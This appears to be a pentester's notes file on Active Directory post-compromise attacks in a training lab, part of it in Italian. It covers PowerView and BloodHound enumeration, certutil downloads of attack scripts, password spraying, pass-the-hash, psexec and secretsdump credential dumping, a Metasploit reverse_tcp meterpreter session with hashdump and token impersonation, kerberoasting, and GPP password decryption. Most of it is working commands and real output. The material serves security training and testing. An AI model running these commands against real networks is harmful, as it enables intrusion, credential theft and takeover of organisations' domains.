# Active Directory Post Compromise

- [PowerView](#powerview)
- [Bloodhound](#bloodhound)
- [crackmapexec](#crackmapexec)
- [pass the hash attack](#pass-the-hash-attack)
- [psexec](#psexec)
- [secretsdump.py](#secretsdump.py)
- [token impersonation)(#token-impersonation)
- [kerberoasting](#kerberoasting)
- [cPassword](#cpassword)
- [mimkatz](#mimikatz)

## PowerView

https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon

get the tool on target machine:

```
C:\Users\fcastle\Downloads>certutil -urlcache -f https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1 c:\users\fcastle\downloads\powerview.ps1
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

Important: run PowerShell with ExecutionPolicy "bypass"

```
powershell -ep bypass
oppure
powershell -ExecutionPolicy bypass
```

some initial stuff:

```
PS C:\Users\fcastle\Downloads> get-netdomain


Forest                  : MARVEL.local
DomainControllers       : {HYDRA-PC.MARVEL.local}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : HYDRA-PC.MARVEL.local
RidRoleOwner            : HYDRA-PC.MARVEL.local
InfrastructureRoleOwner : HYDRA-PC.MARVEL.local
Name                    : MARVEL.local



PS C:\Users\fcastle\Downloads>


PS C:\Users\fcastle\Downloads> Get-NetDomainController


Forest                     : MARVEL.local
CurrentTime                : 8/2/2020 5:57:31 PM
HighestCommittedUsn        : 49267
OSVersion                  : Windows Server 2019 Standard Evaluation
Roles                      : {SchemaRole, NamingRole, PdcRole, RidRole...}
Domain                     : MARVEL.local
IPAddress                  : 192.168.88.2
SiteName                   : Default-First-Site-Name
SyncFromAllServersCallback :
InboundConnections         : {}
OutboundConnections        : {}
Name                       : HYDRA-PC.MARVEL.local
Partitions                 : {DC=MARVEL,DC=local, CN=Configuration,DC=MARVEL,DC=local, CN=Schema,CN=Configuration,DC=MARVEL,DC=local, DC=DomainDnsZones,DC=MARVEL,DC=local...}



PS C:\Users\fcastle\Downloads> Get-DomainPolicy


RegistryValues : @{MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.String[]}
SystemAccess   : @{MinimumPasswordAge=1; MaximumPasswordAge=42; LockoutBadCount=0; PasswordComplexity=1; RequireLogonToChangePassword=0; LSAAnonymousNameLookup=0; ForceLogoffWhenHourExpire=0;
                 PasswordHistorySize=24; ClearTextPassword=0; MinimumPasswordLength=7}
Version        : @{Revision=1; signature="$CHICAGO$"}
KerberosPolicy : @{MaxTicketAge=10; MaxServiceAge=600; MaxClockSkew=5; MaxRenewAge=7; TicketValidateClient=1}
Unicode        : @{Unicode=yes}
```

more detail:

```
PS C:\Users\fcastle\Downloads> (Get-DomainPolicy)."systemaccess"


MinimumPasswordAge           : 1
MaximumPasswordAge           : 42
LockoutBadCount              : 0
PasswordComplexity           : 1
RequireLogonToChangePassword : 0
LSAAnonymousNameLookup       : 0
ForceLogoffWhenHourExpire    : 0
PasswordHistorySize          : 24
ClearTextPassword            : 0
MinimumPasswordLength        : 7
```

users:

```
PS C:\Users\fcastle\Downloads> get-netuser
PS C:\Users\fcastle\Downloads> get-netuser | select cn

cn
--
Administrator
Guest
krbtgt
Frank Castle
Tony Stark
Peter Parker
SQL Service
OpvcpUyYqb

o

PS C:\Users\fcastle\Downloads> get-netuser | select samaccountname

samaccountname
--------------
Administrator
Guest
krbtgt
fcastle
tstark
pparker
SQLService
OpvcpUyYqb
```

Last password change:

```
PS C:\Users\fcastle\Downloads> Get-UserProperties -Properties pwdlastset

name          pwdlastset
----          ----------
Administrator 7/18/2020 12:54:03 PM
Guest         1/1/1601 1:00:00 AM
krbtgt        7/18/2020 2:42:31 PM
Frank Castle  7/18/2020 5:01:28 PM
Tony Stark    7/18/2020 5:03:03 PM
Peter Parker  7/18/2020 5:04:11 PM
SQL Service   7/18/2020 5:07:28 PM
OpvcpUyYqb    8/2/2020 4:01:22 PM
```

how many times logged in:

```
PS C:\Users\fcastle\Downloads> Get-UserProperties -Properties logoncount

name          logoncount
----          ----------
Administrator         36
Guest                  0
krbtgt                 0
Frank Castle          20
Tony Stark             0
Peter Parker           8
SQL Service            0
OpvcpUyYqb             0
```

Failed attempt:

```
PS C:\Users\fcastle\Downloads> Get-UserProperties -Properties badpwdcount

name          badpwdcount
----          -----------
Administrator           1
Guest                   0
krbtgt                  0
Frank Castle            0
Tony Stark              0
Peter Parker            1
SQL Service             0
OpvcpUyYqb              0
```

computers in domain:

```
PS C:\Users\fcastle\Downloads> get-netcomputer
HYDRA-PC.MARVEL.local
THEPUNISHER.MARVEL.local
SPIDERMAN.MARVEL.local
```

Operating systems:

```
PS C:\Users\fcastle\Downloads> get-netcomputer -Fulldata | select OperatingSystem

operatingsystem
---------------
Windows Server 2019 Standard Evaluation
Windows 10 Enterprise Evaluation
Windows 10 Enterprise Evaluation
```

group list:

```
PS C:\Users\fcastle\Downloads> get-netgroup
```

members of group "x":

```
PS C:\Users\fcastle\Downloads> Get-NetGroupMember -groupname "domain admins"


GroupDomain  : MARVEL.local
GroupName    : Domain Admins
MemberDomain : MARVEL.local
MemberName   : SQLService
MemberSid    : S-1-5-21-365715507-4192407378-1384770248-1107
IsGroup      : False
MemberDN     : CN=SQL Service,CN=Users,DC=MARVEL,DC=local

GroupDomain  : MARVEL.local
GroupName    : Domain Admins
MemberDomain : MARVEL.local
MemberName   : tstark
MemberSid    : S-1-5-21-365715507-4192407378-1384770248-1105
IsGroup      : False
MemberDN     : CN=Tony Stark,CN=Users,DC=MARVEL,DC=local

GroupDomain  : MARVEL.local
GroupName    : Domain Admins
MemberDomain : MARVEL.local
MemberName   : Administrator
MemberSid    : S-1-5-21-365715507-4192407378-1384770248-500
IsGroup      : False
MemberDN     : CN=Administrator,CN=Users,DC=MARVEL,DC=local
```

share list:

```
PS C:\Users\fcastle\Downloads> Invoke-ShareFinder
\\HYDRA-PC.MARVEL.local\ADMIN$  - Remote Admin
\\HYDRA-PC.MARVEL.local\C$      - Default share
\\HYDRA-PC.MARVEL.local\hackme  -
\\HYDRA-PC.MARVEL.local\IPC$    - Remote IPC
\\HYDRA-PC.MARVEL.local\NETLOGON        - Logon server share
\\HYDRA-PC.MARVEL.local\SYSVOL  - Logon server share
\\THEPUNISHER.MARVEL.local\ADMIN$       - Remote Admin
\\THEPUNISHER.MARVEL.local\C$   - Default share
\\THEPUNISHER.MARVEL.local\IPC$         - Remote IPC
\\THEPUNISHER.MARVEL.local\Share        -
```

last policies with recent changes:

```
PS C:\Users\fcastle\Downloads> get-netgpo | select displayname, whenchanged

displayname                       whenchanged
-----------                       -----------
Default Domain Policy             7/18/2020 12:44:32 PM
Default Domain Controllers Policy 7/18/2020 12:41:07 PM
Disable Windows Defender          7/18/2020 3:20:17 PM
Force Desktop Wallpaper           7/27/2020 8:44:51 PM
```

## Bloodhound

```
# apt install bloodhound
```

neo4j console
connect to http://localhost:7474
change password for neo4j (default user/pass: neo4j)

https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1

```
C:\Users\fcastle\Downloads>certutil -urlcache -f https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1  c:\users\fcastle\downloads\sharphound.ps1
****  Online  ****
CertUtil: -URLCache command completed successfully.

c:\users\fcastle\Downloads>powershell -ep bypass
PS C:\Users\fcastle\Downloads> . .\sharphound.ps1

PS C:\Users\fcastle\Downloads> Invoke-BloodHound -CollectionMethod all -Domain MARVEL.local -ZipFilename file.zip
```

transfer file to Kali (where is Bloodhound)
"upload data"
select zipfile from above

enjoy the graphs

find users with sessions / tokens

## crackmapexec

```
# apt install crackmapexec
```

```
root@kali:~# crackmapexec
usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--darrell] [--verbose] {winrm,ssh,mssql,smb} ...

      ______ .______           ___        ______  __  ___ .___  ___.      ___      .______    _______ ___   ___  _______   ______
     /      ||   _  \         /   \      /      ||  |/  / |   \/   |     /   \     |   _  \  |   ____|\  \ /  / |   ____| /      |
    |  ,----'|  |_)  |       /  ^  \    |  ,----'|  '  /  |  \  /  |    /  ^  \    |  |_)  | |  |__    \  V  /  |  |__   |  ,----'
    |  |     |      /       /  /_\  \   |  |     |    <   |  |\/|  |   /  /_\  \   |   ___/  |   __|    >   <   |   __|  |  |
    |  `----.|  |\  \----. /  _____  \  |  `----.|  .  \  |  |  |  |  /  _____  \  |  |      |  |____  /  .  \  |  |____ |  `----.
     \______|| _| `._____|/__/     \__\  \______||__|\__\ |__|  |__| /__/     \__\ | _|      |_______|/__/ \__\ |_______| \______|

                                         A swiss army knife for pentesting networks
                                    Forged by @byt3bl33d3r using the powah of dank memes

                                                      Version: 5.0.2dev
                                                     Codename: P3l1as

optional arguments:
  -h, --help            show this help message and exit
  -t THREADS            set how many concurrent threads to use (default: 100)
  --timeout TIMEOUT     max timeout in seconds of each thread (default: None)
  --jitter INTERVAL     sets a random delay between each connection (default: None)
  --darrell             give Darrell a hand
  --verbose             enable verbose output

protocols:
  available protocols

  {winrm,ssh,mssql,smb}
    winrm               own stuff using WINRM
    ssh                 own stuff using SSH
    mssql               own stuff using MSSQL
    smb                 own stuff using SMB

Ya feelin' a bit buggy all of a sudden?
```

Once you got a password, you can spray it on network:

```
root@kali:~# crackmapexec smb 192.168.88.0/24 -u fcastle -d MARVEL.local -p Password1
SMB         192.168.88.2    445    HYDRA-PC         [*] Windows 10.0 Build 17763 (name:HYDRA-PC) (domain:MARVEL.local) (signing:True) (SMBv1:False)
SMB         192.168.88.3    445    THEPUNISHER      [*] Windows 10.0 Build 19041 (name:THEPUNISHER) (domain:MARVEL.local) (signing:False) (SMBv1:False)
SMB         192.168.88.2    445    HYDRA-PC         [+] MARVEL.local\fcastle:Password1
SMB         192.168.88.3    445    THEPUNISHER      [+] MARVEL.local\fcastle:Password1
```

to grab SAM file:

```
root@kali:~# crackmapexec smb 192.168.88.0/24 -u fcastle -d MARVEL.local -p Password1 --sam
```

## Pass the hash attack

To test local users (not domain users)

```
root@kali:~/tcm# crackmapexec smb 192.168.88.0/24 -u "Frank Castle" -H c39f2beb3d2ec06a62cb887fb391dee0 --local-auth
```

remember:
ntlm can be "pass" (hashcat -m 1000)
ntlm v2 NO :(

## psexec

to gain a remote shell on target:

```
# psexec.py marvel/fcastle:Password1@192.168.88.3
```

if you only got the hash, you can use it:

```
# psexec.py "frank castle"@192.168.88.3 -hashes aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0
```

## secretsdump.py

```
root@kali:~# secretsdump.py marvel/fcastle:Password1@192.168.88.4
Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x0e4275d7260558766159ed57c60d5354
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:08f94cb392028fe6240c50c314fb913c:::
Peter Parker:1002:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
[*] Dumping cached domain logon information (domain/username:hash)
MARVEL.LOCAL/Administrator:$DCC2$10240#Administrator#c7154f935b7d1ace4c1d72bd4fb7889c
MARVEL.LOCAL/pparker:$DCC2$10240#pparker#36a5d54b17416e276a7ca65469fd56d8
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
MARVEL\SPIDERMAN$:aes256-cts-hmac-sha1-96:2731bde114fcdd9e8ed4990e2e4216b2673c7d5e4e1bbf8ce51bb4a9c45b7f32
MARVEL\SPIDERMAN$:aes128-cts-hmac-sha1-96:908efddd28d2e234cf1d2cfa2bc26edd
MARVEL\SPIDERMAN$:des-cbc-md5:bf670e4ac2e0c4a4
MARVEL\SPIDERMAN$:aad3b435b51404eeaad3b435b51404ee:635a05100327b84f77681910d6af9458:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0xee9a9725d00b8b982a0fb0141d20709b85a8e4a0
dpapi_userkey:0x6a12aeba4f7878866385852dc5d3f18154c1e1e4
[*] NL$KM
 0000   12 D3 81 51 18 CC 71 56  F8 F3 B4 6C A7 57 54 EC   ...Q..qV...l.WT.
 0010   84 D5 C8 2F 24 AA AE E7  0C 0A F4 C5 8B 8E 74 79   .../$.........ty
 0020   28 AD 73 C6 27 26 F9 70  A1 EE C1 D1 4E 8C 76 08   (.s.'&.p....N.v.
 0030   DD 95 9A 3A 7D 96 F2 52  E4 BD 1D 6C A0 38 4F BC   ...:}..R...l.8O.
NL$KM:12d3815118cc7156f8f3b46ca75754ec84d5c82f24aaaee70c0af4c58b8e747928ad73c62726f970a1eec1d14e8c7608dd959a3a7d96f252e4bd1d6ca0384fbc
[*] Cleaning up...
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

then, pass hash to hashcat:

```
C:\Users\sugo\Downloads\hashcat-6.0.0>hashcat.exe -m 1000 hashes2.txt rockyou.txt
hashcat (v6.0.0) starting...

* Device #3: CUDA SDK Toolkit installation NOT detected.
             CUDA SDK Toolkit installation required for proper device support and utilization
             Falling back to OpenCL Runtime

* Device #3: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
nvmlDeviceGetFanSpeed(): Not Supported

OpenCL API (OpenCL 2.0 ) - Platform #1 [Intel(R) Corporation]
=============================================================
* Device #1: Intel(R) HD Graphics 5500, 3160/3224 MB (806 MB allocatable), 24MCU
* Device #2: Intel(R) Core(TM) i5-5200U CPU @ 2.20GHz, skipped

OpenCL API (OpenCL 1.2 CUDA 9.1.193) - Platform #2 [NVIDIA Corporation]
=======================================================================
* Device #3: GeForce 830M, 1664/2048 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 215 MB

Dictionary cache built:
* Filename..: rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

31d6cfe0d16ae931b73c59d7e0c089c0:     <========== se appare "blank", vuol dire che l'account Ã¨ disabilitato
c39f2beb3d2ec06a62cb887fb391dee0:Password2
```

## Token impersonation

a "token" is like "cookie" for browsers.

https://www.offensive-security.com/metasploit-unleashed/fun-incognito/

```
msf5 > use exploit/windows/smb/psexec
msf5 exploit(windows/smb/psexec) > set RHOSTS 192.168.88.4
RHOSTS => 192.168.88.4
msf5 exploit(windows/smb/psexec) > set SMBDomain marvel.local
SMBDomain => marvel.local
msf5 exploit(windows/smb/psexec) > set SMBPass Password1
SMBPass => Password1
msf5 exploit(windows/smb/psexec) > set SMBUser fcastle
SMBUser => fcastle
msf5 exploit(windows/smb/psexec) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   PowerShell
   2   Native upload
   3   MOF upload


msf5 exploit(windows/smb/psexec) > set target 2
target => 2
msf5 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                192.168.88.4     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             marvel.local     no        The Windows domain to use for authentication
   SMBPass               Password1        no        The password for the specified username
   SMBUser               fcastle          no        The username to authenticate as


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   Native upload


msf5 exploit(windows/smb/psexec) > set LHOST 192.168.88.19
LHOST => 192.168.88.19
msf5 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 192.168.88.19:4444
[*] 192.168.88.4:445 - Connecting to the server...
[*] 192.168.88.4:445 - Authenticating to 192.168.88.4:445|marvel.local as user 'fcastle'...
[*] 192.168.88.4:445 - Uploading payload... bhAMcyoa.exe
[*] 192.168.88.4:445 - Created \bhAMcyoa.exe...
[+] 192.168.88.4:445 - Service started successfully...
[*] 192.168.88.4:445 - Deleting \bhAMcyoa.exe...
[*] Sending stage (206403 bytes) to 192.168.88.4
[*] Meterpreter session 1 opened (192.168.88.19:4444 -> 192.168.88.4:50065) at 2020-10-03 13:02:30 +0200

meterpreter >
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Peter Parker:1002:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:08f94cb392028fe6240c50c314fb913c:::

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
Computer        : SPIDERMAN
OS              : Windows 10 (10.0 Build 19041).
Architecture    : x64
System Language : en_US
Domain          : MARVEL
Logged On Users : 5
Meterpreter     : x64/windows

meterpreter > load
load espia       load incognito   load lanattacks  load peinjector  load python      load unhook
load extapi      load kiwi        load mimikatz    load powershell  load sniffer     load winpmem
meterpreter > load incognito
Loading extension incognito...Success.
meterpreter >
```

to list tokens:

```
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-1
MARVEL\administrator

Impersonation Tokens Available
========================================
No tokens available

meterpreter > impersonate_token MARVEL\\administrator

shell .... 
whoami ....
```

"rev2self" is useful to back to your original identity (fcastle)

## Kerberoasting

an authenticated user get "TGT" to KDC (domain controller)

DC responds with ticket

after this, when user requests access to some services, DC reply with TGS

(ticket granting service) with HASH of that service


get Impacket:


```
# mkdir /opt/tools/
# cd /opt/tools/
# git clone https://github.com/SecureAuthCorp/impacket.git
# cd impacket
# apt install python3-pip
# pip3 install .

..
..
Successfully installed impacket-0.9.22.dev1+20200929.152157.fe642b24
```

to request ticket from KDC:

```
root@kaligra:~# GetUserSPNs.py marvel.local/fcastle:Password1 -dc-ip 192.168.88.2 -request                                                                                                    Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName                    Name        MemberOf                                                     PasswordLastSet             LastLogon  Delegation
--------------------------------------  ----------  -----------------------------------------------------------  --------------------------  ---------  ----------
HYDRA-DC/SQLService.MARVEL.local:60111  SQLService  CN=Group Policy Creator Owners,OU=Groups,DC=MARVEL,DC=local  2020-07-18 17:07:28.787548  <never>



$krb5tgs$23$*SQLService$MARVEL.LOCAL$marvel.local/SQLService*$41f06892d15c1e0acd6a1e79002473f6$a64ef1269f414ce1644ad010e3dea0baf107c33dd3e7ccdce2be9e946ebf50495e951ed055f35bef94a015e4e8f8a2e57bcee20a30f69cd60ca14ef7274b78a0c7f3dd44c19d5ef626a810b63db2808f1906ee6cfe163ee4f18bccddbfdbcb282d7c48de375eb2d9051c323a5209e5417d47c26ea69c50d533f1b2763ceed4585f09ce6b85290d5fda2e7fd9a3fa366fb8892cbe8b78caee7352820e992a7a2f6cfc26e5c4d7132932d0aded2ff30c2634bc58ab5d709ca10e033a79d7ac595a7317780d3df2516933535aea9c970d68b6be30db74c148f56995cf232eefd76d58af0774af229e363148c1fd27893c3ad686032b084e236b3da78632cd7bc4b887ee0d5c6d54ae29549ce5a3597372f91e349c6872c45fceadbd52d696909c4015cb0cf3ef9d6b54a7e286c8edca305d997b43745c087dceb696d5fa78c66708a8ea8936f028ef5a6ac34bf4cd6f7a1651b84f45601711c25b7682303308b1aa50d35aeaaf912ed20c38aeb52cf6056787d45d593cbca212a0b57c634435b0794374b37f215a216a9756ea4179731107a81b7bf48d107110c8bf843ec78ce62257f0855fe516e35831eb8d059b08072aed8044c974ad503fbef8361e39d85a7e21c222042f278895cffe87e6b8f06ba6a3e0018b160566a06ae947ab87e9a90837c8061497402946d2bfcf7ddf4718307ea2b43dc5c4a7c3710b80150073d791433684804a6957dad0017458ff55780cc190323ca105952e0c5fbad3ec8cdf9b9fd03bb8e727d28202acc49d2fcfa03eca9a76dba8bf7c46c70b2bfbffbfe193484d95bfb111f1c7eabcdeb5b076d7ca8daf5df57476fc280c3a099ca42049c8df6759b67cdde67446b54dc9b37fc9c1fda205c72d28a7cda53c9b4dfb62006f53219275c5c881b76833ac786c0a6e7c3fbde214813908d8faa261a507b064fb82a2f76a38d4f1c8b5574e5be4db0b0e77832f102a28ffb836223e61ed229fe23313b3718da30fa22c18fce2d039802cfb2c79606155a27ea0f2e81d6053ea456244644e1acb124d32eac0cd10fd977d090e11713bb19f125eb5a2a4a1c1610e0bdbe951a7efd69ea0617ad63c0be5746cc6c571c9e4a9841aa28be61a885ba2592ba3ec36dc4763ee9565f0f3da0d8efb271df82d09a300726e10da65b2c97bcc358c007d65112b51eda4d79c40597b03400f2931260c4ddddc5bd5869afdf52f57804c6e97152ce89da07200dd6aa902bcee4c0109f4d09c3fca633e4612760681875b8f61ddf25a96e1cf28c00735f479d2ee0e9103b6d0dd196fec9b2233272c77e7
```

copy hash, and crack it with hashcat and the right module:

```
D:\tmrc\tools\hashcat-6.0.0>hashcat.exe --help  | findstr Kerb
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth            | Network Protocols
  13100 | Kerberos 5, etype 23, TGS-REP                    | Network Protocols
  18200 | Kerberos 5, etype 23, AS-REP                     | Network Protocols
  19600 | Kerberos 5, etype 17, TGS-REP                    | Network Protocols
  19700 | Kerberos 5, etype 18, TGS-REP                    | Network Protocols
  19800 | Kerberos 5, etype 17, Pre-Auth                   | Network Protocols
  19900 | Kerberos 5, etype 18, Pre-Auth                   | Network Protocols
```

in that case, 13100 "| Kerberos 5, etype 23, TGS-REP | Network Protocols)"


```
D:\tmrc\tools\hashcat-6.0.0>hashcat.exe -m 13100 hashes5.txt ..\..\hacking\wordlist\rockyou.txt
hashcat (v6.0.0) starting...


D:\tmrc\tools\hashcat-6.0.0>hashcat.exe -m 13100 hashes5.txt ..\..\hacking\wordlist\rockyou.txt --show
$krb5tgs$23$*SQLService$MARVEL.LOCAL$marvel.local/SQLService*$41f06892d15c1e0acd6a1e79002473f6$a64ef1269f414ce1644ad010e3dea0baf107c33dd3e7ccdce2be9e946ebf50495e951ed055f35bef94a015e4e8f8a2e57bcee20a30f69cd60ca14ef7274b78a0c7f3dd44c19d5ef626a810b63db2808f1906ee6cfe163ee4f18bccddbfdbcb282d7c48de375eb2d9051c323a5209e5417d47c26ea69c50d533f1b2763ceed4585f09ce6b85290d5fda2e7fd9a3fa366fb8892cbe8b78caee7352820e992a7a2f6cfc26e5c4d7132932d0aded2ff30c2634bc58ab5d709ca10e033a79d7ac595a7317780d3df2516933535aea9c970d68b6be30db74c148f56995cf232eefd76d58af0774af229e363148c1fd27893c3ad686032b084e236b3da78632cd7bc4b887ee0d5c6d54ae29549ce5a3597372f91e349c6872c45fceadbd52d696909c4015cb0cf3ef9d6b54a7e286c8edca305d997b43745c087dceb696d5fa78c66708a8ea8936f028ef5a6ac34bf4cd6f7a1651b84f45601711c25b7682303308b1aa50d35aeaaf912ed20c38aeb52cf6056787d45d593cbca212a0b57c634435b0794374b37f215a216a9756ea4179731107a81b7bf48d107110c8bf843ec78ce62257f0855fe516e35831eb8d059b08072aed8044c974ad503fbef8361e39d85a7e21c222042f278895cffe87e6b8f06ba6a3e0018b160566a06ae947ab87e9a90837c8061497402946d2bfcf7ddf4718307ea2b43dc5c4a7c3710b80150073d791433684804a6957dad0017458ff55780cc190323ca105952e0c5fbad3ec8cdf9b9fd03bb8e727d28202acc49d2fcfa03eca9a76dba8bf7c46c70b2bfbffbfe193484d95bfb111f1c7eabcdeb5b076d7ca8daf5df57476fc280c3a099ca42049c8df6759b67cdde67446b54dc9b37fc9c1fda205c72d28a7cda53c9b4dfb62006f53219275c5c881b76833ac786c0a6e7c3fbde214813908d8faa261a507b064fb82a2f76a38d4f1c8b5574e5be4db0b0e77832f102a28ffb836223e61ed229fe23313b3718da30fa22c18fce2d039802cfb2c79606155a27ea0f2e81d6053ea456244644e1acb124d32eac0cd10fd977d090e11713bb19f125eb5a2a4a1c1610e0bdbe951a7efd69ea0617ad63c0be5746cc6c571c9e4a9841aa28be61a885ba2592ba3ec36dc4763ee9565f0f3da0d8efb271df82d09a300726e10da65b2c97bcc358c007d65112b51eda4d79c40597b03400f2931260c4ddddc5bd5869afdf52f57804c6e97152ce89da07200dd6aa902bcee4c0109f4d09c3fca633e4612760681875b8f61ddf25a96e1cf28c00735f479d2ee0e9103b6d0dd196fec9b2233272c77e7:MYpassword123#
```

## cPassword

cPassword or GPP attacket (Group Policy Preferences) MS14-025

https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/

you must find Groups.xml which contains something like:

```
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

there is an active users: active.htb\SVC_TGS

and an hash:

```
edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

Crack it:

```
root@kaligra:/opt/htb/Active# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
GPPstillStandingStrong2k18
```

and use that password:

```
GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
```

found this:

```
D:\download\tools\hashcat-6.1.1>hashcat.exe -m 13100 active_hashes.txt ..\..\..\tmrc\hacking\wordlist\rockyou.txt
hashcat (v6.1.1) starting...

* Device #1: CUDA SDK Toolkit installation NOT detected.
             CUDA SDK Toolkit installation required for proper device support and utilization
             Falling back to OpenCL Runtime

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
OpenCL API (OpenCL 1.2 CUDA 10.1.120) - Platform #1 [NVIDIA Corporation]
========================================================================
* Device #1: GeForce GTX 750 Ti, 1472/2048 MB (512 MB allocatable), 5MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 151 MB

Dictionary cache built:
* Filename..: ..\..\..\tmrc\hacking\wordlist\rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =>

Session..........: hashcat
Status...........: Running
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...d4d0d3
Time.Started.....: Sat Oct 03 16:54:12 2020 (2 secs)
